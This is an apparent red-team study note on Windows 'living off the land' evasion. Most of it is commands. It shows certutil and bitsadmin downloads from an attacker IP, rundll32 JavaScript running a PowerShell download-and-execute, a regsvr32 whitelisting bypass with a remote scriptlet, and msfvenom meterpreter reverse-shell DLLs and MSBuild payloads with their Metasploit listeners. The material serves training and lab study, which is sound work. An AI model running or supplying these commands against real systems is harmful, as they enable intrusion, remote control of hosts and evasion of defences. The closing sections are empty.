---
{"dg-publish":true,"permalink":"/cards/red-team/living-off-the-land/","tags":["red-team/host-evasion"]}
---

~ [[atlas/red-team\|red-team]]
### Introduction 
---
The name is taken from real-life, its living by eating the available food on the land, applying this to cybersecurity, Windows comes off with a lot of binaries/tools pre-installed in the OS.

These built-in tools are (abused) Microsoft-signed programs, scripts, and libraries to blend in and evade detections.

#### Key Topics
---
- [[#Prerequisites|Basic knowledge areas required before exploring Living Off the Land, such as initial access and hacking fundamentals.]]
    
- [[#Windows Sysinternals|Overview of Sysinternals tools, their categories, and how attackers abuse them despite being trusted utilities.]]
    
- [[#LOLBAS Project|Introduction to the Living Off the Land Binaries And Scripts project, documenting legitimate Microsoft-signed tools for offensive use.]]
    
- [[#File Operations|Examples of abusing system binaries like certutil, BITSAdmin, and findstr for downloading, encoding, and moving files.]]
    
- [[#File Execution|Techniques for executing payloads stealthily using trusted binaries such as explorer.exe, wmic, and rundll32.]]
    
- [[#Application Whitelisting Bypasses|Methods to bypass application whitelisting controls with tools like regsvr32 and bash.exe (WSL).]]
    
- [[#Other Techniques|Additional approaches including shortcut abuse and PowerLessShell to execute payloads without PowerShell processes.]]
    
- [[#Conclusion|Closing notes on how attackers leverage native tools to evade detection while blending into normal system activity.]]
## Prerequisites
---
- Initial Access Techniques
- General Hacking Knowledge
## Windows Sysinternals
---
Windows Sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the Windows operating system.

The tools is categorized intp:

- Disk management
- Process management
- Networking tools
- System information
- Security tools
### Sysinternals Live
---
One of its cool features there is no installation needed all we need to is inputting `\\live.sysinternals.com\tools` into Windows Explorer or download them one by one:

![Living off the Land.png|450](/img/user/cards/red-team/images/Living%20off%20the%20Land.png)

Unfortunately due to their inherent trust they have within the Operating System, they are commonly abused by Red teamers for defense evasion purposes, the good thing is blue teamers are now more aware of their malicious usage and has implemented defensive controls against them.
## LOLBAS Project
---
LOLBAS stands for **L**iving **O**ff the **L**and **B**inaries **A**nd **S**cripts, a project's primary main goal is to gather and document the Microsoft-signed and built-in tools used as Living Off the Land techniques, including binaries, scripts, and libraries.

![Living off the Land-1.png|500](/img/user/cards/red-team/images/Living%20off%20the%20Land-1.png)
### Tools Criteria
---
Specific criteria are required for a tool to be a "Living Off the Land" technique and accepted as part of the LOLBAS project:  

- Microsoft-signed file native to the OS or downloaded from Microsoft.  

- Having additional interesting unintended functionality not covered by known use cases.  

- Benefits an APT (Advanced Persistent Threat) or Red Team engagement.
#### Interesting Functionalities
---
The LOLBAS project accepts tool submissions that fit one of the following functionalities:

- Arbitrary code execution
- File operations, including downloading, uploading, and copying files.
- Compiling code
- Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.  
- UAC bypass
- Dumping process memory
- DLL injection

## File Operations
---

**Certutil:**

Download files:
```C
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```

- `-urlcache` to display URL, enables the URL option to use in the command
- `-split -f ` to split and force fetching files from the provided URL.

The certutil.exe can be used as an encoding tool where we can encode files and decode the content of files

```C
certutil -encode payload.exe Encoded-payload.txt
```

**BITSAdmin:**

Download and execute:
```C
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```

**FindStr:**

findstr.exe to download remote files from SMB shared folders within the network as follows,

```C
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```

- `/V` to print out the lines that don't contain the string provided.

- `dummystring` the text to be searched for; in this case, we provide a string that must not be found in a file.

- `> c:\Windows\Temp\test.exe` redirect the output to a file on the target machine.

## File Execution
---
The typical case of executing a binary involves various known methods such as using the command line `cmd.exe` or from the desktop (GUI). In our case we can achieve **payload execution by abusing system binaries** with two main reason in mind is either two hide or harden the payload's process.

In MITRE ATT&CK framework, this technique is called S**igned Binary Proxy Execution** or **Indirect Command Execution**.

**File explorer:**

`explorer.exe` can be abused to execute malicious scripts as this is the file manager and system component for Windows:

```C
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

**Note:** double clicking an executable will have a parent of `explorer.exe`.

**wmic:**

It is a Windows command-line utility that manages Windows components. Researchers found that WMIC can be used to execute binaries evading defensive measures.

```C
wmic.exe process call create calc
```

**rundll32:**

It is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage rundll32.exe to run arbitrary payloads and execute JavaScript (with a caveat) and PowerShell scripts.

```C
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

- `mshtml.dll` is a Internet Explorer/HTML engine, which supports running JScript/VBScript.

Command to run a JavaScript that executes a PowerShell script to download from a remote website:

```C
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

## Application Whitelisting Bypasses
---
Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system. It is a feature from Microsoft Endpoint Security Suite.

**Regsvr32:**

**Intended Purpose:** register and unregister Dynamic Link Libraries (DLLs) in Windows Registry.

Adversaries leverage regsvr32.exe to execute native code or scripts locally or remotely. The technique used in the regsvr32.exe uses trusted Windows OS components and is executed in memory, which is one of the reasons why this technique is also used to bypass application whitelisting.

- C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
- C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version

Demonstration:

**1. Create a malicious .dll using msfvenom**

```C
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll 
```

**2. Create a Metasploit listener to receive a reverse shell**

```C
msfconsole -q 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp 
set LHOST ATTACKBOX_IP
set LPORT 443 
exploit
```

**3. Transfer the malicious .dll**

For demonstration purpose, we use:

```C
python3 -m http.server 1337
```

**4. Execute the .dll using regsvr32.exe**

```C
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
```

Or

```C
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
```

- `/s`: in silent mode (without showing messages)

- `/n`: to not call the DLL register server (by default it calls the exported function `DLLRegisterServer` but we want to simply load and execute.)

- `/i`:: this will load `mylib.dll`, look for a function named `DllInstall`, and call it. after passing argument to `/i` this will call `DllInstall("argumentHere", ...)` so in our case it will download and execute a file from our attacker server.

- `/u`: calls the `DllUnregisterServer` function inside the DLL. Typically removes registry entries, but attackers can write a DLL that does _malicious stuff_ instead of just unregistering.

**Bourne Again Shell (BASH):**

Windows Subsystem for Linux (WSL), introduced in Windows 10 and later, lets you run Linux directly on Windows. There are two versions: WSL1 (translation layer -- **translates Linux system calls into Windows calls**) and WSL2 (lightweight virtual machine with a real Linux kernel). Users can install Linux distributions and interact with them using tools like **bash.exe**.

```C
bash.exe -c "path-to-payload"
```

In ATT&CK this technique is called **Indirect Command Execution** where attackers abuse the Windows tools utility to obtain command executions.

Obviously to use this it requires WSL installed.
## Other Techniques
---
Interesting techniques used for initial access or persistence.

**Shortcuts:**

Shortcuts or a symbolic links points to a resource such as file or executable located within the operating system.

![Living off the Land-2.png|350](/img/user/cards/red-team/images/Living%20off%20the%20Land-2.png)

The above image shows replacing the Target with `rundll32.exe` to execute JavaScript code.

Checkout this [Github repo](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md) for more information and techniques.

**No PowerShell:**

In 2019, threat detection report stating that PowerShell is the most used technique for malicious activities in turn organization started to monitor or block powershell.exe from being executed.

Introducing **PowerLessShell** a python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on MSBuild, a platform for building applications, to execute remote code.

```C
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```

Generate a PowerShell payload to make it suitable to work with MSBuild:

```C
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
```

Of course a listener (One liner):

```C
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
```

Navigate to the PowerLessShell directory and convert our msfvenom `.ps1` file into a file compatible with MSBuild:

```C
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
```

Once the conversion is complete, transfer the `.csproj` file to the victim (for demonstration purposes use simple python server) and build it with `MSBuild.exe`:

```C
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```

Wait for the build to finish to receive the reverse shell then have a look at Task Manager and see if PowerShell process:

Attacker:

![Living off the Land-3.png](/img/user/cards/red-team/images/Living%20off%20the%20Land-3.png)

Task Manager at Victim:

![Living off the Land-4.png](/img/user/cards/red-team/images/Living%20off%20the%20Land-4.png)


### Questions and Problems
---
## Conclusion


